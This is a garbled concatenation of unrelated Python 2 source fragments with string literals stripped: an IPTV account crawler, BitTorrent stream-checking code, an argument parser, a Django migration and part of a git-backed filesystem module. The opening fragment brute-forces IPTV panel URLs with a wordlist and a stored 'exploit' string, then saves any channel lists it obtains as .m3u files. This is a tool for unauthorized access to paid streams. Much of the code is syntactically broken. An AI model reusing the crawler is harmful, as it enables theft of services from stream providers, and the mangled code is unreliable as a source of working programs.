~~~ """Search Accounts\n        This is the core method. It will crawl the give url for any possible accounts\n        If we found any we will create a new directory under /output with the name\n        of the site plus every account as five .m3u. Please use VLC for opening that\n        kind of files\n\n        Keyword arguments:\n        url -- an url from the fetched list. (default None)\n\n        Return:\n        string -- the status of the crawling session\n        """ \n 
if not self . parsedUrls : \n 
~~~ return "You must fetch some URLs first" \n 
~~ try : \n 
~~~ if not url : \n 
~~~ url = random . choice ( self . parsedUrls ) \n 
~~ fileName = self . languageDir + "/" + self . language + ".txt" \n 
fileLength = self . file_length ( fileName ) \n 
progressBar = pyprind . ProgBar ( fileLength , title = "Fetching account from " + url + " this might take a while." foundedAccounts = 0 \n 
with open ( fileName ) as f : \n 
~~~ rows = f . readlines ( ) \n 
~~ for row in rows : \n 
# Do the injection to the current url using the exploit that we know \n 
~~~ opener = urllib2 . build_opener ( ) \n 
opener . addheaders = [ ( , ) ] \n 
response = opener . open ( url + self . basicString % ( row . rstrip ( ) . lstrip ( ) , row . rstrip ( ) fetched = response . read ( ) \n 
# Update the progress bar in order to give to the user a nice \n 
# way to indicate the time left \n 
fileLength = fileLength - 1 \n 
progressBar . update ( ) \n 
# IF the fetched content is not empty \n 
# we build the dedicated .m3u file \n 
if len ( fetched ) > 0 : \n 
~~~ newPath = self . outputDir + "/" + url . replace ( "http://" , "" ) \n 
self . create_file ( row , newPath , fetched ) \n 
# Remove the current used url in order to avoid to parse it again \n 
~~ ~~ self . parsedUrls . remove ( url ) \n 
if self . foundedAccounts != 0 : \n 
~~~ return "Search done, account founded on " + url + ": " + str ( self . foundedAccounts ) \n 
~~ else : \n 
~~~ return "No results for " + url \n 
~~ ~~ except IOError : \n 
~~~ return "Cannot open the current Language file. Try another one" \n 
~~ except urllib2 . HTTPError , e : \n 
~~~ return "Ops, HTTPError exception here. Cannot fetch the current URL " + str ( e . code ) \n 
~~ except urllib2 . URLError , e : \n 
~~~ return "Ops, the URL seems broken." + str ( e . reason ) \n 
~~ except Exception : \n 
~~~ return "Ops something went wrong!" \n 
\n 
~~ ~~ def create_file ( self , row , newPath , fetched ) : \n 
~~~ """Create File\n        Once the parse founds something worth it, we need to create the .m3u file\n        to do so we except a newPath and the current row used from names file and also\n        the content from the fetched response\n\n        Keyword arguments:\n        row -- row of the language file, this allow us to understand which names\n        were useful for the brute force.\n\n        newPath -- The path that we use to store the current fetched accounts.\n\n        fetched -- the current response file from the attack.\n        """ \n 
if os . path . exists ( newPath ) is False : \n 
~~~ os . makedirs ( newPath ) \n 
~~ outputFile = open ( str ( newPath ) + "/tv_channels_%s.m3u" % row . rstrip ( ) . lstrip ( ) , "w" ) \n 
outputFile . write ( fetched ) \n 
self . foundedAccounts = self . foundedAccounts + 1 \n 
outputFile . close ( ) \n 
\n 
~~ def file_length ( self , fileName ) : \n 
~~~ """File Length\n        Cheapest way to calculate the rows of a file\n\n        Keyword arguments:\n        fileName -- string the filename into which we will check its Length\n        """ \n 
with open ( fileName ) as f : \n 
~~~ for i , l in enumerate ( f ) : \n 
~~~ pass \n 
~~ ~~ return i + 1 \n 
# Written by Bram Cohen \n 
# see LICENSE.txt for license information \n 
\n 
~~ ~~ from cStringIO import StringIO \n 
from binascii import b2a_hex \n 
from urllib import quote \n 
import Connecter \n 
try : \n 
~~~ True \n 
~~ except : \n 
~~~ True = 1 \n 
False = 0 \n 
\n 
~~ DEBUG = False \n 
\n 
\n 
protocol_name = \n 
option_pattern = chr ( 0 ) * 8 \n 
\n 
def toint ( s ) : \n 
~~~ return long ( b2a_hex ( s ) , 16 ) \n 
\n 
~~ def tohex ( s ) : \n 
~~~ return b2a_hex ( s ) . upper ( ) \n 
\n 
~~ def make_readable ( s ) : \n 
~~~ if not s : \n 
~~~ return \n 
~~ if quote ( s ) . find ( ) >= 0 : \n 
~~~ return tohex ( s ) \n 
~~ return \'"\' + s + \'"\' \n 
\n 
# header, reserved, download id, my id, [length, message] \n 
\n 
~~ streamno = 0 \n 
\n 
\n 
class StreamCheck : \n 
~~~ def __init__ ( self ) : \n 
~~~ global streamno \n 
self . no = streamno \n 
streamno += 1 \n 
self . buffer = StringIO ( ) \n 
self . next_len , self . next_func = 1 , self . read_header_len \n 
\n 
~~ def read_header_len ( self , s ) : \n 
~~~ if ord ( s ) != len ( protocol_name ) : \n 
~~~ print self . no , \n 
~~ return len ( protocol_name ) , self . read_header \n 
\n 
~~ def read_header ( self , s ) : \n 
~~~ if s != protocol_name : \n 
~~~ print self . no , \n 
~~ return 8 , self . read_reserved \n 
\n 
~~ def read_reserved ( self , s ) : \n 
~~~ return 20 , self . read_download_id \n 
\n 
~~ def read_download_id ( self , s ) : \n 
~~~ if DEBUG : \n 
~~~ print self . no , + tohex ( s ) \n 
~~ return 20 , self . read_peer_id \n 
\n 
~~ def read_peer_id ( self , s ) : \n 
~~~ if DEBUG : \n 
~~~ print self . no , + make_readable ( s ) \n 
~~ return 4 , self . read_len \n 
\n 
~~ def read_len ( self , s ) : \n 
~~~ l = toint ( s ) \n 
if l > 2 ** 23 : \n 
~~~ print self . no , + str ( l ) + + s + \n 
~~ return l , self . read_message \n 
\n 
~~ def read_message ( self , s ) : \n 
~~~ if not s : \n 
~~~ return 4 , self . read_len \n 
~~ m = s [ 0 ] \n 
if ord ( m ) > 8 : \n 
~~~ print self . no , + str ( ord ( m ) ) \n 
~~ if m == Connecter . REQUEST : \n 
~~~ if len ( s ) != 13 : \n 
~~~ print self . no , + str ( len ( s ) ) \n 
return 4 , self . read_len \n 
~~ index = toint ( s [ 1 : 5 ] ) \n 
begin = toint ( s [ 5 : 9 ] ) \n 
length = toint ( s [ 9 : ] ) \n 
print self . no , + str ( index ) + + str ( begin ) + + str ( begin ) + + str ( length ) \n 
~~ elif m == Connecter . CANCEL : \n 
~~~ if len ( s ) != 13 : \n 
~~~ print self . no , + str ( len ( s ) ) \n 
return 4 , self . read_len \n 
~~ index = toint ( s [ 1 : 5 ] ) \n 
begin = toint ( s [ 5 : 9 ] ) \n 
length = toint ( s [ 9 : ] ) \n 
print self . no , + str ( index ) + + str ( begin ) + + str ( begin ) + + str ( length ) \n 
~~ elif m == Connecter . PIECE : \n 
~~~ index = toint ( s [ 1 : 5 ] ) \n 
begin = toint ( s [ 5 : 9 ] ) \n 
length = len ( s ) - 9 \n 
print self . no , + str ( index ) + + str ( begin ) + + str ( begin ) + + str ( length ) \n 
~~ else : \n 
~~~ print self . no , + str ( ord ( m ) ) + + str ( len ( s ) ) + \n 
~~ return 4 , self . read_len \n 
\n 
~~ def write ( self , s ) : \n 
~~~ while 1 : \n 
~~~ i = self . next_len - self . buffer . tell ( ) \n 
if i > len ( s ) : \n 
~~~ self . buffer . write ( s ) \n 
return \n 
~~ self . buffer . write ( s [ : i ] ) \n 
s = s [ i : ] \n 
m = self . buffer . getvalue ( ) \n 
self . buffer . reset ( ) \n 
self . buffer . truncate ( ) \n 
x = self . next_func ( m ) \n 
self . next_len , self . next_func = x \n 
# Written by Bill Bumgarner and Bram Cohen \n 
# see LICENSE.txt for license information \n 
\n 
~~ ~~ ~~ from types import * \n 
from cStringIO import StringIO \n 
\n 
\n 
def splitLine ( line , COLS = 80 , indent = 10 ) : \n 
~~~ indent = " " * indent \n 
width = COLS - ( len ( indent ) + 1 ) \n 
if indent and width < 15 : \n 
~~~ width = COLS - 2 \n 
indent = " " \n 
~~ s = StringIO ( ) \n 
i = 0 \n 
for word in line . split ( ) : \n 
~~~ if i == 0 : \n 
~~~ s . write ( indent + word ) \n 
i = len ( word ) \n 
continue \n 
~~ if i + len ( word ) >= width : \n 
~~~ s . write ( + indent + word ) \n 
i = len ( word ) \n 
continue \n 
~~ s . write ( + word ) \n 
i += len ( word ) + 1 \n 
~~ return s . getvalue ( ) \n 
\n 
~~ def formatDefinitions ( options , COLS , presets = { } ) : \n 
~~~ s = StringIO ( ) \n 
for ( longname , default , doc ) in options : \n 
~~~ s . write ( + longname + ) \n 
default = presets . get ( longname , default ) \n 
if type ( default ) in ( IntType , LongType ) : \n 
~~~ try : \n 
~~~ default = int ( default ) \n 
~~ except : \n 
~~~ pass \n 
~~ ~~ if default is not None : \n 
~~~ doc += + repr ( default ) + \n 
~~ s . write ( splitLine ( doc , COLS , 10 ) ) \n 
s . write ( ) \n 
~~ return s . getvalue ( ) \n 
\n 
\n 
~~ def usage ( string ) : \n 
~~~ raise ValueError ( string ) \n 
\n 
\n 
~~ def defaultargs ( options ) : \n 
~~~ l = { } \n 
for ( longname , default , doc ) in options : \n 
~~~ if default is not None : \n 
~~~ l [ longname ] = default \n 
~~ ~~ return l \n 
\n 
\n 
~~ def parseargs ( argv , options , minargs = None , maxargs = None , presets = { } ) : \n 
~~~ config = { } \n 
longkeyed = { } \n 
for option in options : \n 
~~~ longname , default , doc = option \n 
longkeyed [ longname ] = option \n 
config [ longname ] = default \n 
~~ for longname in presets . keys ( ) : # presets after defaults but before arguments \n 
~~~ config [ longname ] = presets [ longname ] \n 
~~ options = [ ] \n 
args = [ ] \n 
pos = 0 \n 
while pos < len ( argv ) : \n 
~~~ if argv [ pos ] [ : 2 ] != : \n 
~~~ args . append ( argv [ pos ] ) \n 
pos += 1 \n 
~~ else : \n 
~~~ if pos == len ( argv ) - 1 : \n 
~~~ usage ( ) \n 
~~ key , value = argv [ pos ] [ 2 : ] , argv [ pos + 1 ] \n 
pos += 2 \n 
if not longkeyed . has_key ( key ) : \n 
~~~ usage ( + key ) \n 
~~ longname , default , doc = longkeyed [ key ] \n 
try : \n 
~~~ t = type ( config [ longname ] ) \n 
if t is NoneType or t is StringType : \n 
~~~ config [ longname ] = value \n 
~~ elif t in ( IntType , LongType ) : \n 
~~~ config [ longname ] = long ( value ) \n 
~~ elif t is FloatType : \n 
~~~ config [ longname ] = float ( value ) \n 
~~ else : \n 
~~~ assert 0 \n 
~~ ~~ except ValueError , e : \n 
~~~ usage ( % ( key , str ( e ) ) ) \n 
~~ ~~ ~~ for key , value in config . items ( ) : \n 
~~~ if value is None : \n 
~~~ usage ( "Option --%s is required." % key ) \n 
~~ ~~ if minargs is not None and len ( args ) < minargs : \n 
~~~ usage ( "Must supply at least %d args." % minargs ) \n 
~~ if maxargs is not None and len ( args ) > maxargs : \n 
~~~ usage ( "Too many args - %d max." % maxargs ) \n 
~~ return ( config , args ) \n 
\n 
~~ def test_parseargs ( ) : \n 
~~~ assert parseargs ( ( , , , , , , , , ) , ( ( , , ) , ( , assert parseargs ( [ ] , [ ( , , ) ] ) == ( { : } , [ ] ) \n 
assert parseargs ( [ , , , ] , [ ( , , ) ] ) == ( { : } , [ ] ) \n 
try : \n 
~~~ parseargs ( [ ] , [ ( , , ) ] ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ try : \n 
~~~ parseargs ( [ , ] , [ ] ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ try : \n 
~~~ parseargs ( [ ] , [ ( , , ) ] ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ try : \n 
~~~ parseargs ( [ ] , [ ] , 1 , 2 ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ assert parseargs ( [ ] , [ ] , 1 , 2 ) == ( { } , [ ] ) \n 
assert parseargs ( [ , ] , [ ] , 1 , 2 ) == ( { } , [ , ] ) \n 
try : \n 
~~~ parseargs ( [ , , ] , [ ] , 1 , 2 ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ try : \n 
~~~ parseargs ( [ , ] , [ ( , 3 , ) ] ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ try : \n 
~~~ parseargs ( [ , ] , [ ( , 2.1 , ) ] ) \n 
~~ except ValueError : \n 
~~~ pass \n 
\n 
# -*- coding: utf-8 -*- \n 
~~ ~~ import datetime \n 
from south . db import db \n 
from south . v2 import SchemaMigration \n 
from django . db import models \n 
\n 
\n 
class Migration ( SchemaMigration ) : \n 
\n 
~~~ def forwards ( self , orm ) : \n 
\n 
~~~ db . add_column ( , , \n 
self . gf ( ) ( to = orm [ keep_default = False ) \n 
\n 
\n 
~~ def backwards ( self , orm ) : \n 
\n 
~~~ db . delete_column ( , ) \n 
\n 
\n 
~~ models = { \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } : ( , [ ] , { : "orm[\'auth.Permission\']" } , \n 
: { \n 
: { : "(\'content_type__app_label\', \'content_type__model\', \'codename\')" , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'contenttypes.ContentType\']" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : "orm[\'auth.Group\']" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : : ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'auth.Permission\']" : ( , [ ] , { : , : } , \n 
: { \n 
: { : "(\'name\',)" , : "((\'app_label\', \'model\'),)" , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) \n 
} , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : "\'taggit_taggeditem_tagged_items\'" : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "\'taggit_taggeditem_items\'" } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : , : ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : , } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : "orm[\'videoportal.Channel\']" : ( , [ ] , { : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : , : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'videoportal.Video\']" } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : "orm[\'videoportal.Video\']" } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'videoportal.Channel\']" : ( , [ ] , { : , : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : } , \n 
: { \n 
: { : } , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : "orm[\'videoportal.Channel\']" : ( , [ ] , { : , : ( , [ ] , { } ) , \n 
: ( , [ ] , { } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : , : ( , [ ] , { : } ) , \n 
: ( , [ ] , { : } ) , \n 
: ( , [ ] , { : , : : ( , [ ] , { : "orm[\'auth.User\']" , : ( , [ ] , { : , : : ( , [ ] , { : , : : ( , [ ] , { : , : } \n 
} \n 
\n 
complete_apps = [ ] # Copyright 2014 PressLabs SRL \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
\n 
~~ import os \n 
from collections import namedtuple \n 
from shutil import rmtree \n 
from stat import S_IFDIR , S_IFREG , S_IFLNK \n 
\n 
from pygit2 import ( clone_repository , Signature , GIT_SORT_TOPOLOGICAL , \n 
GIT_FILEMODE_TREE , GIT_STATUS_CURRENT , \n 
GIT_FILEMODE_LINK , GIT_FILEMODE_BLOB , GIT_BRANCH_REMOTE , \n 
GIT_BRANCH_LOCAL , GIT_FILEMODE_BLOB_EXECUTABLE ) \n 
from six import iteritems \n 
\n 
from gitfs . cache import CommitCache \n 
from gitfs . log import log \n 
from gitfs . utils . path import split_path_into_components \n 
from gitfs . utils . commits import CommitsList \n 
\n 
\n 
DivergeCommits = namedtuple ( "DivergeCommits" , [ "common_parent" , \n 
"first_commits" , "second_commits" ] ) \n 
\n 
\n 
class Repository ( object ) : \n 
\n 
~~~ def __init__ ( self , repository , commits = None ) : \n 
~~~ self . _repo = repository \n 
self . commits = commits or CommitCache ( self ) \n 
\n 
self . behind = False \n 
\n 
~~ def __getitem__ ( self , item ) : \n 
~~~ """\n        Proxy method for pygit2.Repository\n        """ \n 
\n 
return self . _repo [ item ] \n 
\n 
~~ def __getattr__ ( self , attr ) : \n 
~~~ """\n        Proxy method for pygit2.Repository\n        """ \n 
\n 
if attr not in self . __dict__ : \n 
~~~ return getattr ( self . _repo , attr ) \n 
~~ else : \n 
~~~ return self . __dict__ [ attr ] \n 
\n 
~~ ~~ def ahead ( self , upstream , branch ) : \n 
~~~ ahead , _ = self . diverge ( upstream , branch ) \n 
return ahead \n 
\n 
~~ def diverge ( self , upstream , branch ) : \n 
~~~ reference = "{}/{}" . format ( upstream , branch ) \n 
remote_branch = self . lookup_branch ( reference , GIT_BRANCH_REMOTE ) \n 
local_branch = self . lookup_branch ( branch , GIT_BRANCH_LOCAL ) \n 
\n 
if remote_branch . target == local_branch . target : \n 
~~~ return False , False \n 
\n 
~~ diverge_commits = self . find_diverge_commits ( local_branch , \n 
remote_branch ) \n 
behind = len ( diverge_commits . second_commits ) > 0 \n 
ahead = len ( diverge_commits . first_commits ) > 0 \n 
\n 
return ahead , behind \n 
\n 
~~ def checkout ( self , ref , * args , ** kwargs ) : \n 
~~~ result = self . _repo . checkout ( ref , * args , ** kwargs ) \n 
\n 
# update ignore cache after a checkout \n 
self . ignore . update ( ) \n 
\n 
status = self . _repo . status ( ) \n 
for path , status in iteritems ( status ) : \n 
# path is in current status, move on \n 
~~~ if status == GIT_STATUS_CURRENT : \n 
~~~ continue \n 
\n 
# check if file exists or not \n 
~~ full_path = self . _full_path ( path ) \n 
if path not in self . _repo . index : \n 
~~~ if path not in self . ignore : \n 
~~~ try : \n 
~~~ os . unlink ( full_path ) \n 
~~ except OSError : \n 
# path points to a directory containing untracked files \n 
~~~ rmtree ( \n 
full_path , \n 
onerror = lambda function , fpath , excinfo : log . info ( \n 
"Repository: Checkout couldn\'t delete %s" , fpath \n 
) \n 
) \n 
~~ ~~ continue \n 
\n 
# check files stats \n 
~~ stats = self . get_git_object_default_stats ( ref , path ) \n 
current_stat = os . lstat ( full_path ) \n 
\n 
if stats [ ] != current_stat . st_mode : \n 
~~~ os . chmod ( full_path , current_stat . st_mode ) \n 
self . _repo . index . add ( self . _sanitize ( path ) ) \n 
\n 
~~ ~~ return result \n 
\n 
~~ def _sanitize ( self , path ) : \n 
~~~ if path is not None and path . startswith ( "/" ) : \n 
~~~ path = path [ 1 : ] \n 
~~ return path \n 
\n 
~~ def push ( self , upstream , branch , credentials ) : \n 
~~~ """ Push changes from a branch to a remote\n\n        Examples::\n\n                repo.push("origin", "master")\n        """ \n 
\n 
remote = self . get_remote ( upstream ) \n 
remote . push ( [ "refs/heads/%s" % ( branch ) ] , callbacks = credentials ) \n 
\n 
~~ def fetch ( self , upstream , branch_name , credentials ) : \n 
~~~ """\n        Fetch from remote and return True if we are behind or False otherwise\n        """ \n 
\n 
remote = self . get_remote ( upstream ) \n 
remote . fetch ( callbacks = credentials ) \n 
\n 
_ , behind = self . diverge ( upstream , branch_name ) \n 
self . behind = behind \n 
return behind \n 
\n 
~~ def commit ( self , message , author , commiter , parents = None , ref = "HEAD" ) : \n 
~~~ """ Wrapper for create_commit. It creates a commit from a given ref\n        (default is HEAD)\n        """ \n 
\n 
status = self . _repo . status ( ) \n 
if status == { } : \n 
~~~ return None \n 
\n 
# sign the author \n 
~~ author = Signature ( author [ 0 ] , author [ 1 ] ) \n 
commiter = Signature ( commiter [ 0 ] , commiter [ 1 ] ) \n 
\n 
# write index localy \n 
tree = self . _repo . index . write_tree ( ) \n 
self . _repo . index . write ( ) \n 
\n 
# get parent \n 
if parents is None : \n 
~~~ parents = [ self . _repo . revparse_single ( ref ) . id ] \n 
\n 
~~ return self . _repo . create_commit ( ref , author , commiter , message , \n 
tree , parents ) \n 
\n 
~~ @ classmethod \n 
def clone ( cls , remote_url , path , branch = None , credentials = None ) : \n 
~~~ """Clone a repo in a give path and update the working directory with\n        a checkout to head (GIT_CHECKOUT_SAFE_CREATE)\n\n        :param str remote_url: URL of the repository to clone\n\n        :param str path: Local path to clone into\n\n        :param str branch: Branch to checkout after the\n        clone. The default is to use the remote\'s default branch.\n\n        """ \n 
\n 
repo = clone_repository ( remote_url , path , checkout_branch = branch , \n 
callbacks = credentials ) \n 
repo . checkout_head ( ) \n 
return cls ( repo ) \n 
\n 
~~ def _is_searched_entry ( self , entry_name , searched_entry , path_components ) : \n 
~~~ """\n        Checks if a tree entry is the one that is being searched for. For\n        that, the name has to correspond and it has to be the last element\n        in the path_components list (this means that the path corresponds\n        exactly).\n\n        :param entry_name: the name of the tree entry\n        :param searched_entry: the name of the object that is being searched\n                               for\n        :type searched_entry: str\n        :param path_components: the path of the object being searched for\n        :type path_components: list\n        """ \n 
\n 
return ( entry_name == searched_entry and \n 
len ( path_components ) == 1 and \n 
entry_name == path_components [ 0 ] ) \n 
\n 
~~ def _get_git_object ( self , tree , obj_name , path_components , modifier ) : \n 
~~~ """\n        It recursively searches for the object in the repository. To declare\n        an object as found, the name and the relative path have to correspond.\n        It also includes the relative path as a condition for success, to avoid\n        finding an object with the correct name but with a wrong location.\n\n        :param tree: a `pygit2.Tree` instance\n        :param entry_name: the name of the object\n        :type entry_name: str\n        :param path_components: the path of the object being searched for as\n            a list (e.g: for \'/a/b/c/file.txt\' => [\'a\', \'b\', \'c\', \'file.txt\'])\n        :type path_components: list\n        :param modifier: a function used to retrieve some specific\n            characteristic of the git object\n        :type modifier: function\n        :returns: an instance corresponding to the object that is being\n            searched for in case of success, or None otherwise.\n        :rtype: one of the following:\n            an instance of `pygit2.Tree`\n            an instance of `pygit2.Blob`\n            None\n        """ \n 
\n 
git_obj = None \n 
for entry in tree : \n 
~~~ if self . _is_searched_entry ( entry . name , obj_name , path_components ) : \n 
~~~ return modifier ( entry ) \n 
~~ elif entry . filemode == GIT_FILEMODE_TREE : \n 
~~~ git_obj = self . _get_git_object ( self . _repo [ entry . id ] , obj_name , \n 
path_components [ 1 : ] , modifier ) \n 
if git_obj : \n 
~~~ return git_obj \n 
\n 
~~ ~~ ~~ return git_obj \n 
\n 
~~ def get_git_object_type ( self , tree , path ) : \n 
~~~ """\n        Returns the filemode of the git object with the relative path <path>.\n\n        :param tree: a `pygit2.Tree` instance\n        :param path: the relative path of the object\n        :type entry_name: str\n        :returns: the filemode for the entry in case of success\n            (which can be one of the following) or None otherwise.\n            0     (0000000)  GIT_FILEMODE_NEW\n            16384 (0040000)  GIT_FILEMODE_TREE\n            33188 (0100644)  GIT_FILEMODE_BLOB\n            33261 (0100755)  GIT_FILEMODE_BLOB_EXECUTABLE\n            40960 (0120000)  GIT_FILEMODE_LINK\n            57344 (0160000)  GIT_FILEMODE_COMMIT\n        :rtype: int, None\n        """ \n 
\n 
path_components = split_path_into_components ( path ) \n 
try : \n 
~~~ return self . _get_git_object ( tree , path_components [ - 1 ] , \n 
path_components , \n 
lambda entry : entry . filemode ) \n 
~~ except : \n 
~~~ return GIT_FILEMODE_TREE \n 
\n 
~~ ~~ def get_git_object ( self , tree , path ) : \n 
~~~ """\n        Returns the git object with the relative path <path>.\n\n        :param tree: a `pygit2.Tree` instance\n        :param path: the relative path of the object\n        :type path: str\n        :returns: an instance corresponding to the object that is being\n            searched for in case of success, or None else.\n        :rtype: one of the following:\n            an intance of `pygit2.Tree`\n            an intance of `pygit2.Blob`\n            None\n        """ \n 
\n 
# It acts as a proxy for the _get_git_object method, which \n 
# does the actual searching. \n 
path_components = split_path_into_components ( path ) \n 
return self . _get_git_object ( tree , path_components [ - 1 ] , path_components , \n 
lambda entry : self . _repo [ entry . id ] ) \n 
\n 
~~ def get_git_object_default_stats ( self , ref , path ) : \n 
~~~ types = { \n 
GIT_FILEMODE_LINK : { \n 
: S_IFLNK | 0o444 , \n 
} , GIT_FILEMODE_TREE : { \n 
: S_IFDIR | 0o555 , \n 
: 2 \n 
} , GIT_FILEMODE_BLOB : { \n 
: S_IFREG | 0o444 , \n 
} , GIT_FILEMODE_BLOB_EXECUTABLE : { \n 
: S_IFREG | 0o555 , \n 
} , \n 
} \n 
\n 
if path == "/" : \n 
~~~ return types [ GIT_FILEMODE_TREE ] \n 
\n 
~~ obj_type = self . get_git_object_type ( ref , path ) \n 
if obj_type is None : \n 
~~~ return obj_type \n 
\n 
~~ stats = types [ obj_type ] \n 
if obj_type in [ GIT_FILEMODE_BLOB , GIT_FILEMODE_BLOB_EXECUTABLE ] : \n 
~~~ stats [ ] = self . get_blob_size ( ref , path ) \n 
\n 
~~ return stats \n 
\n 
~~ def get_blob_size ( self , tree , path ) : \n 
~~~ """\n        Returns the size of a the data contained by a blob object\n        with the relative path <path>.\n\n        :param tree: a `pygit2.Tree` instance\n        :param path: the relative path of the object\n        :type path: str\n        :returns: the size of data contained by the blob object.\n        :rtype: int\n        """ \n 
return self . get_git_object ( tree , path ) . size \n 
\n 
~~ def get_blob_data ( self , tree , path ) : \n 
~~~ """\n        Returns the data contained by a blob object with the relative\n        path <path>.\n\n        :param tree: a `pygit2.Tree` instance\n        :param path: the relative path of the object\n        :type path: str\n        :returns: the data contained by the blob object.\n        :rtype: str\n        """ \n 
return self . get_git_object ( tree , path ) . data \n 
\n 
~~ def get_commit_dates ( self ) : \n 
~~~ """\n        Walk through all commits from current repo in order to compose the\n        _history_ directory.\n        """ \n 
return list ( self . commits . keys ( ) ) \n 
\n 
~~ def get_commits_by_date ( self , date ) : \n 
~~~ """\n        Retrieves all the commits from a particular date.\n\n        :param date: date with the format: yyyy-mm-dd\n        :type date: str\n        :returns: a list containg the commits for that day. Each list item\n            will have the format: hh:mm:ss-<short_sha1>, where short_sha1 is\n            the short sha1 of the commit (first 10 characters).\n        :rtype: list\n        """ \n 
return list ( map ( str , self . commits [ date ] ) ) \n 
\n 
~~ def walk_branches ( self , sort , * branches ) : \n 
~~~ """\n        Simple iterator which take a sorting strategy and some branch and\n        iterates through those branches one commit at a time, yielding a list\n        of commits\n\n        :param sort: a sorting option `GIT_SORT_NONE, GIT_SORT_TOPOLOGICAL,\n        GIT_SORT_TIME, GIT_SORT_REVERSE`. Default is \'GIT_SORT_TOPOLOGICAL\'\n        :param branches: branch to iterate through\n        :type branches: list\n        :returns: yields a list of commits corresponding to given branches\n        :rtype: list\n\n        """ \n 
\n 
iterators = [ self . _repo . walk ( branch . target , sort ) \n 
for branch in branches ] \n 
stop_iteration = [ False for branch in branches ] \n 
\n 
commits = [ ] \n 
for iterator in iterators : \n 
~~~ try : \n 
~~~ commit = next ( iterator ) \n 
~~ except StopIteration : \n 
~~~ commit = None \n 
~~ commits . append ( commit ) \n 
\n 
~~ yield ( commit for commit in commits ) \n 
\n 
while not all ( stop_iteration ) : \n 
~~~ for index , iterator in enumerate ( iterators ) : \n 
~~~ try : \n 
~~~ commit = next ( iterator ) \n 
commits [ index ] = commit \n 
~~ except StopIteration : \n 
~~~ stop_iteration [ index ] = True \n 
\n 
~~ ~~ if not all ( stop_iteration ) : \n 
~~~ yield ( commit for commit in commits ) \n 
\n 
~~ ~~ ~~ def remote_head ( self , upstream , branch ) : \n 
~~~ ref = "%s/%s" % ( upstream , branch ) \n 
remote = self . _repo . lookup_branch ( ref , GIT_BRANCH_REMOTE ) \n 
return remote . get_object ( ) \n 
\n 
~~ def get_remote ( self , name ) : \n 
~~~ """ Retrieve a remote by name. Raise a ValueError if the remote was not\n        added to repo\n\n        Examples::\n\n                repo.get_remote("fork")\n        """ \n 
\n 
remote = [ remote for remote in self . _repo . remotes \n 
if remote . name == name ] \n 
\n 
if not remote : \n 
~~~ raise ValueError ( "Missing remote" ) \n 
\n 
~~ return remote [ 0 ] \n 
\n 
~~ def _full_path ( self , partial ) : \n 
~~~ if partial . startswith ( "/" ) : \n 
~~~ partial = partial [ 1 : ] \n 
~~ return os . path . join ( self . _repo . workdir , partial ) \n 
\n 
~~ def find_diverge_commits ( self , first_branch , second_branch ) : \n 
